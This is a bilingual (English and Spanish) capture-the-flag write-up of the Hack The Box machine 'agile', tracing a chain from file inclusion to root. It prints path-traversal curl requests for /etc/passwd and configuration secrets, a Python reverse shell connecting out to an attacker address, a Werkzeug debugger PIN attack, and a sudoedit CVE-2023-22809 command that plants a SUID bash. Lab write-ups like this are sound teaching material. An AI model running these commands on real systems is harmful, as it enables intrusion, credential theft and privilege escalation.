<!DOCTYPE html>
<html lang="es" data-theme="light">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>agile | Writeup</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="../../index.css">
</head>

<body>
  <nav class="top-nav">
    <div class="container">
      <div class="nav-content">
        <div class="nav-left">
          <a href="../../index.html" class="back-link" title="Back to home">‚Üê</a>
          <h1 data-i18n="site-title">KDW_LABS</h1>
        </div>
        <div class="nav-controls">
          <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
            <span class="theme-icon">üåô</span>
          </button>
          <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
            <span>EN</span>
          </button>
        </div>
      </div>
    </div>
  </nav>

  <main class="container">
    <header class="machine-header">
      <h1 class="machine-title">agile</h1>
      <div class="machine-meta">
        <span class="badge badge-platform">HTB</span>
        <span class="badge badge-difficulty-medium">medium</span>
      </div>
    </header>

    <article class="machine-content">
      <div id="content-en" class="lang-content" style="display:none;">
        <div class="machine-summary">
          <h2 data-i18n="summary-title">Exploitation Summary</h2>
          <p><strong>Exploitation process:</strong> Exploited a Local File Inclusion (LFI) in a Flask web application to
            obtain sensitive system information and configuration files. Using this information, the Werkzeug debugger
            PIN was generated to gain a reverse shell as <code>www-data</code>. After pivoting to the <code>corum</code>
            user using database credentials, Selenium was used to inspect a remote Chrome session belonging to the
            <code>runner</code> user and obtain <code>edwards</code>'s credentials. Finally, a <code>sudoedit</code>
            vulnerability (CVE-2023-22809) was used to modify the Python virtual environment activation script, which
            was sourced by all users including root, allowing privilege escalation via a SUID bash.</p>
          <p><strong>Technologies/Exploits:</strong> LFI, Werkzeug PIN Exploit, Selenium Hijacking, Sudoedit
            CVE-2023-22809.</p>
        </div>
        <hr class="summary-divider">
        <p>Nmap:</p>
        <p><img src="./media/image7.png" alt="Nmap Results" /></p>
        <p>I add <code>superpass.htb</code> to <code>/etc/hosts</code>.</p>
        <p>It's a password vault web app with registration, login, and this functionality. When I try to register, I
          encounter this:</p>
        <p><img src="./media/image3.png" alt="Registration Error" /></p>
        <p>It seems they left dev mode active or something similar, as it dumps too much info. It also seems to
          intermittently lose the database connection, triggering this.</p>
        <p>There doesn't seem to be SQL injection here, but reproducing this with Burp Suite reveals information not
          visible on the web:</p>
        <pre><code class="language-html">// Werkzeug Debugger&lt;/title&gt;
&lt;link rel="stylesheet" href="?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css"&gt;
&lt;link rel="shortcut icon" href="?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png"&gt;
&lt;script src="?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js"&gt;&lt;/script&gt;
&lt;script&gt;
var CONSOLE_MODE = false,
EVALEX = true,
EVALEX_TRUSTED = false,
SECRET = "kCIewyRYkkhJTUw6qNHD";
&lt;/script&gt;</code></pre>
        <p>I can also try to access the debugger, but I don't know the PIN. This secret isn't the Werkzeug debugger PIN,
          but now I know Werkzeug is one of the technologies used.</p>
        <p>I also see these leaked details:</p>
        <ul>
          <li>Application path: <code>/app/app/superpass/</code></li>
          <li>Main app file: <code>/app/app.py</code> or <code>/app/app/superpass/app.py</code></li>
          <li>Python version: <code>python3.10</code></li>
        </ul>
        <p>Investigating the application with Burp Suite, I discover an LFI and see these users:</p>
        <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../../../../../../../../../../../../../../../../etc/passwd -H "Cookie: session={jwt}"</code></pre>
        <pre><code class="language-text">root:x:0:0:root:/root:/bin/bash
(...)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
(...)
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash</code></pre>
        <p>In <code>/proc/self/environ</code> I find: <code>CONFIG_PATH=/app/config_prod.json</code>. In this file, I
          find MySQL credentials:</p>
        <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../app/config_prod.json -H "Cookie: session={jwt}"</code></pre>
        <pre><code class="language-json">{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}</code></pre>
        <p>However, the password doesn't work via SSH for the users I've seen. Regardless, with debugger access and LFI,
          it's possible to gather enough info to get the Werkzeug PIN. I'll collect the necessary data:</p>
        <ul>
          <li>MAC (<code>/sys/class/net/eth0/address</code>): <code>00:50:56:94:f1:6a</code></li>
          <li>Machine-id (<code>/etc/machine-id</code>): <code>ed5b159560f54721827644bc9b220d00</code></li>
          <li>User running the app (<code>/proc/self/environ</code>): <code>www-data</code></li>
          <li>Python app path: <code>/app/venv/lib/python3.10/site-packages/flask/app.py</code></li>
          <li>cgroup (<code>/proc/self/cgroup</code>): <code>0::/system.slice/superpass.service</code></li>
          <li>Modname: <code>flask.app</code></li>
          <li>Appname (from error dump): <code>wsgi_app</code></li>
        </ul>
        <p>The cgroup value isn't always needed, but checking
          <code>/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py</code>, I saw it is required here:</p>
        <p><img src="./media/image8.png" alt="Werkzeug Source Code Check" /></p>
        <p>Here is a general HackTricks guide for this: <a
            href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug">https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug</a>
        </p>
        <p>Knowing these values, I generate a script and get the PIN: <code>101-676-570</code>. With access to the
          Werkzeug console, I can execute Python, so I send myself a reverse shell:</p>
        <pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.18",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</code></pre>
        <p>I gain access as <code>www-data</code>. In the shell, it's curious that I appear with <code>(venv)</code>
          active until I sanitize my shell. First, I check the database with the credentials I found:</p>
        <pre><code class="language-bash">www-data@agile:/app/app$ mysql -u superpassuser -p superpass</code></pre>
        <p>I find these credentials: <code>corum:5db7caa1d13cc37c9fc2</code> and gain access as <code>corum</code>.</p>
        <p>I see these interesting local TCP ports:</p>
        <p><img src="./media/image2.png" alt="Local Ports" /></p>
        <p>3306 and 33060 are MySQL, 5000 is the app on port 80, 5555 is the testing app (run by <code>runner</code>),
          and 35519/41829 are Chrome ports used for Selenium testing.</p>
        <p><img src="./media/image6.png" alt="Selenium Testing Process" /></p>
        <p>With <code>pspy64</code>, I see <code>runner</code> periodically executing:
          <code>/bin/bash /app/test_and_update.sh</code>. LFI doesn't work in this environment and debug mode is
          disabled. I use local port forwarding for ports <code>41829</code> and <code>5555</code>.</p>
        <p>The goal is to see how tests are performed, as they use credentials in
          <code>/app/app-testing/tests/functional/creds.txt</code>, which I can't read:</p>
        <pre><code class="language-bash">corum@agile:/app/app-testing$ cat tests/functional/creds.txt
cat: tests/functional/creds.txt: Permission denied</code></pre>
        <p>I open Chromium and in <code>chrome://inspect</code>, I add the forwarded port <code>41829</code>:</p>
        <p><img src="./media/image4.png" alt="Chrome Inspect Interface" /> <img src="./media/image5.png"
            alt="Remote Debugging" /></p>
        <p>Clicking "inspect" allows me to see the tests in real-time. I navigate manually to <code>/vault</code> and
          find these credentials:</p>
        <p><img src="./media/image1.png" alt="Exfiltrated Credentials" /></p>
        <p><code>edwards:d07867c6267dcb5df0af</code></p>
        <p><code>edwards</code> has these sudo permissions:</p>
        <pre><code class="language-text">User edwards may run the following commands on agile:
(dev_admin : dev_admin) sudoedit /app/config_test.json
(dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt</code></pre>
        <p><code>sudoedit</code> is equivalent to <code>sudo -e</code>. In <code>creds.txt</code>, I find:
          <code>edwards:1d7ffjwrx#$d6qn!9nndqgde4</code>, but these are only for the test app. Checking the sudo version
          for vulnerabilities:</p>
        <pre><code class="language-bash">edwards@agile:/app$ sudo --version
Sudo version 1.9.9</code></pre>
        <p>It's Sudo version 1.9.9, which is vulnerable to <a
            href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">CVE-2023-22809</a>,
          allowing me to edit any file as <code>dev_admin</code>. The idea is basically this:</p>
        <pre><code class="language-bash">edwards@agile:/app$ EDITOR='nano -- /etc/shadow' sudoedit -u dev_admin /app/config_test.json
sudoedit: /etc/shadow: Permission denied</code></pre>
        <p>I can't edit <code>/etc/shadow</code> here as I don't have permissions, but the POC stands. I search for
          files owned by or in the group <code>dev_admin</code>:</p>
        <pre><code class="language-bash">edwards@agile:/app$ find / -user dev_admin 2&gt;/dev/null
edwards@agile:/app$ find / -group dev_admin 2&gt;/dev/null</code></pre>
        <p>Notable results include <code>/app/venv/bin/activate</code>. Modifying this could affect users who source it.
          In <code>/etc/bash.bashrc</code>, I find:</p>
        <pre><code class="language-bash"># all users will want the env associated with this application
source /app/venv/bin/activate</code></pre>
        <p>This means all users source this file. I add <code>chmod u+s /bin/bash</code> to it via the exploit:</p>
        <pre><code class="language-bash">EDITOR='nano -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json</code></pre>
        <p>After a while, bash becomes SUID. I launch it with <code>-p</code> and get the root flag:</p>
        <pre><code class="language-bash">edwards@agile:/app$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
8adc88ffb03aa241a930a3f72388f1c3</code></pre>
      </div>

      <div id="content-es" class="lang-content">
        <div class="machine-summary">
          <h2 data-i18n="summary-title">Resumen de Explotaci√≥n</h2>
          <p><strong>Resumen del proceso:</strong> Se explot√≥ un LFI en una aplicaci√≥n Flask para obtener informaci√≥n
            sensible del sistema y archivos de configuraci√≥n. Utilizando esta informaci√≥n, se gener√≥ el PIN del debugger
            de Werkzeug para obtener una reverse shell como <code>www-data</code>. Tras pivotar al usuario
            <code>corum</code> mediante credenciales de la base de datos, se utiliz√≥ Selenium para inspeccionar una
            sesi√≥n de Chrome remota del usuario <code>runner</code> y obtener credenciales de <code>edwards</code>.
            Finalmente, se aprovech√≥ una vulnerabilidad de <code>sudoedit</code> (CVE-2023-22809) para modificar el
            script de activaci√≥n del entorno virtual de Python, que era cargado por todos los usuarios (incluido root),
            permitiendo elevar privilegios mediante una bash SUID.</p>
          <p><strong>Tecnolog√≠as/Exploits:</strong> LFI, Werkzeug PIN Exploit, Selenium Hijacking, Sudoedit
            CVE-2023-22809.</p>
        </div>
        <hr class="summary-divider">
        <p>Nmap:</p>
        <p><img src="./media/image7.png" alt="Resultados de Nmap" /></p>
        <p>A√±ado <code>superpass.htb</code> al <code>/etc/hosts</code>.</p>
        <p>Es una web tipo password vault, tiene un registro, login y esta funcionalidad. Cuando intento registrarme me
          encuentro con esto:</p>
        <p><img src="./media/image3.png" alt="Error de Registro" /></p>
        <p>Parece que se han dejado el modo dev activo o algo por el estilo y dumpea demasiada info. Adem√°s parece que
          de manera intermitente pierde conexi√≥n a la db y salta esto.</p>
        <p>No parece que haya inyecci√≥n SQL aqu√≠, pero reproduciendo esto con Burp Suite veo que hay esta informaci√≥n
          que no ve√≠a en la web:</p>
        <pre><code class="language-html">// Werkzeug Debugger&lt;/title&gt;
&lt;link rel="stylesheet" href="?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css"&gt;
&lt;link rel="shortcut icon" href="?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png"&gt;
&lt;script src="?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js"&gt;&lt;/script&gt;
&lt;script&gt;
var CONSOLE_MODE = false,
EVALEX = true,
EVALEX_TRUSTED = false,
SECRET = "kCIewyRYkkhJTUw6qNHD";
&lt;/script&gt;</code></pre>
        <p>Adem√°s puedo intentar acceder al debugger, pero no s√© el PIN. Este secreto no es el PIN para el debugger de
          Werkzeug, pero ahora s√© que Werkzeug es una de las tecnolog√≠as que usa la web.</p>
        <p>Tambi√©n veo estos datos leakeados:</p>
        <ul>
          <li>Application path: <code>/app/app/superpass/</code></li>
          <li>Main app file: <code>/app/app.py</code> o <code>/app/app/superpass/app.py</code></li>
          <li>Python version: <code>python3.10</code></li>
        </ul>
        <p>Investigando la aplicaci√≥n usando Burp Suite descubro un LFI y veo estos usuarios:</p>
        <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../../../../../../../../../../../../../../../../etc/passwd -H "Cookie: session={jwt}"</code></pre>
        <pre><code class="language-text">root:x:0:0:root:/root:/bin/bash
(...)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
(...)
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash</code></pre>
        <p>En <code>/proc/self/environ</code> encuentro esto: <code>CONFIG_PATH=/app/config_prod.json</code>. En este
          archivo encuentro unas credenciales para MySQL:</p>
        <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../app/config_prod.json -H "Cookie: session={jwt}"</code></pre>
        <pre><code class="language-json">{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}</code></pre>
        <p>Pero la pass no funciona por SSH con los usuarios que he visto. De todos modos, pudiendo acceder al debugger
          y teniendo LFI es posible conseguir la informaci√≥n suficiente para conseguir el PIN de Werkzeug. Para esto voy
          a recabar la informaci√≥n necesaria:</p>
        <ul>
          <li>MAC (<code>/sys/class/net/eth0/address</code>): <code>00:50:56:94:f1:6a</code></li>
          <li>Machine-id (<code>/etc/machine-id</code>): <code>ed5b159560f54721827644bc9b220d00</code></li>
          <li>User que corre la app (<code>/proc/self/environ</code>): <code>www-data</code></li>
          <li>Ruta de la app de python (dumpeado error):
            <code>/app/venv/lib/python3.10/site-packages/flask/app.py</code></li>
          <li>cgroup (<code>/proc/self/cgroup</code>): <code>0::/system.slice/superpass.service</code></li>
          <li>Modname: <code>flask.app</code></li>
          <li>Appname (dumpeado error): <code>wsgi_app</code></li>
        </ul>
        <p>El valor cgroup parece que no siempre es necesario pero en este caso mirando en el archivo
          <code>/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py</code> he visto que es necesario:</p>
        <p><img src="./media/image8.png" alt="C√≥digo Werkzeug" /></p>
        <p>Aqu√≠ hay una gu√≠a general para esto de HackTricks: <a
            href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug">https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug</a>
        </p>
        <p>Sabiendo todos estos valores genero un script y consigo el PIN: <code>101-676-570</code>. Teniendo acceso a
          la consola de Werkzeug puedo ejecutar Python, as√≠ que me env√≠o una reverse shell con este comando:</p>
        <pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.18",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</code></pre>
        <p>Y gano acceso a la m√°quina v√≠ctima como <code>www-data</code>, donde me parece curioso que aparezco con el
          <code>(venv)</code> activo hasta que sanitizo mi shell. Aqu√≠ lo primero que hago es mirar la base de datos
          para la que tengo credenciales:</p>
        <pre><code class="language-bash">www-data@agile:/app/app$ mysql -u superpassuser -p superpass</code></pre>
        <p>Encuentro estos credenciales: <code>corum:5db7caa1d13cc37c9fc2</code> y gano acceso al usuario
          <code>corum</code>.</p>
        <p>Veo estos puertos TCP interesantes abiertos localmente:</p>
        <p><img src="./media/image2.png" alt="Puertos Locales" /></p>
        <p>3306 y 33060 es MySQL, 5000 es la app del puerto 80, 5555 es la misma app pero para testing, y esta app la
          ejecuta el usuario <code>runner</code>. 35519 y 41829 son de Chrome, que se usa para el testing mediante
          Selenium.</p>
        <p><img src="./media/image6.png" alt="Proceso Selenium" /></p>
        <p>Con <code>pspy64</code> veo que el usuario <code>runner</code> va ejecutando peri√≥dicamente este comando:
          <code>/bin/bash /app/test_and_update.sh</code>. La vulnerabilidad de LFI ya no funciona en este entorno y el
          modo debug est√° deshabilitado. Hago local port forwarding de los puertos <code>41829</code> y del
          <code>5555</code> para tener acceso desde mi m√°quina.</p>
        <p>La idea es ver c√≥mo se realizan los tests, ya que utilizan unos credenciales disponibles en este archivo al
          que no tengo acceso:</p>
        <pre><code class="language-bash">corum@agile:/app/app-testing$ cat tests/functional/creds.txt
cat: tests/functional/creds.txt: Permission denied</code></pre>
        <p>Abro Chromium y en <code>chrome://inspect</code> a√±ado el puerto <code>41829</code>:</p>
        <p><img src="./media/image4.png" alt="Interfaz de Chrome Inspect" /> <img src="./media/image5.png"
            alt="Depuraci√≥n Remota" /></p>
        <p>Si le doy a "inspect" puedo ver en tiempo real los tests que se hacen. Navego manualmente a
          <code>/vault</code> y consigo estas credenciales:</p>
        <p><img src="./media/image1.png" alt="Credenciales Exfiltradas" /></p>
        <p><code>edwards:d07867c6267dcb5df0af</code></p>
        <p>Edwards tiene estos permisos sudo:</p>
        <pre><code class="language-text">User edwards may run the following commands on agile:
(dev_admin : dev_admin) sudoedit /app/config_test.json
(dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt</code></pre>
        <p><code>sudoedit</code> es lo mismo que <code>sudo -e</code>. En el archivo <code>creds.txt</code> encuentro
          estos credenciales: <code>edwards:1d7ffjwrx#$d6qn!9nndqgde4</code>, pero solo son para el usuario edwards en
          la app de testing. Mirando la versi√≥n de sudo para posibles vulnerabilidades relacionadas con esto:</p>
        <pre><code class="language-bash">edwards@agile:/app$ sudo --version
Sudo version 1.9.9</code></pre>
        <p>Es la versi√≥n 1.9.9, vulnerable a <a
            href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">CVE-2023-22809</a> que
          me permite editar cualquier archivo como <code>dev_admin</code>. La idea es b√°sicamente esta:</p>
        <pre><code class="language-bash">edwards@agile:/app$ EDITOR='nano -- /etc/shadow' sudoedit -u dev_admin /app/config_test.json
sudoedit: /etc/shadow: Permission denied</code></pre>
        <p>En este caso no puedo editar <code>/etc/shadow</code> porque el usuario no tiene permisos para esto, pero la
          PoC sigue en pie. Busco archivos del usuario o grupo <code>dev_admin</code>:</p>
        <pre><code class="language-bash">edwards@agile:/app$ find / -user dev_admin 2&gt;/dev/null
edwards@agile:/app$ find / -group dev_admin 2&gt;/dev/null</code></pre>
        <p>Entre otros, aparece <code>/app/venv/bin/activate</code>. Podr√≠a manipular a usuarios que hagan source de
          este archivo. En <code>/etc/bash.bashrc</code> encuentro esto:</p>
        <pre><code class="language-bash"># all users will want the env associated with this application
source /app/venv/bin/activate</code></pre>
        <p>Esto significa que todos los usuarios har√°n source a este archivo. A√±ado <code>chmod u+s /bin/bash</code> a
          √©l mediante el exploit:</p>
        <pre><code class="language-bash">EDITOR='nano -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json</code></pre>
        <p>Y espero un rato, despu√©s del cual veo que la bash es SUID. Me doy una bash privilegiada y consigo la flag:
        </p>
        <pre><code class="language-bash">edwards@agile:/app$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
8adc88ffb03aa241a930a3f72388f1c3</code></pre>
      </div>
    </article>
  </main>
  <script src="../../index.js"></script>
</body>

</html>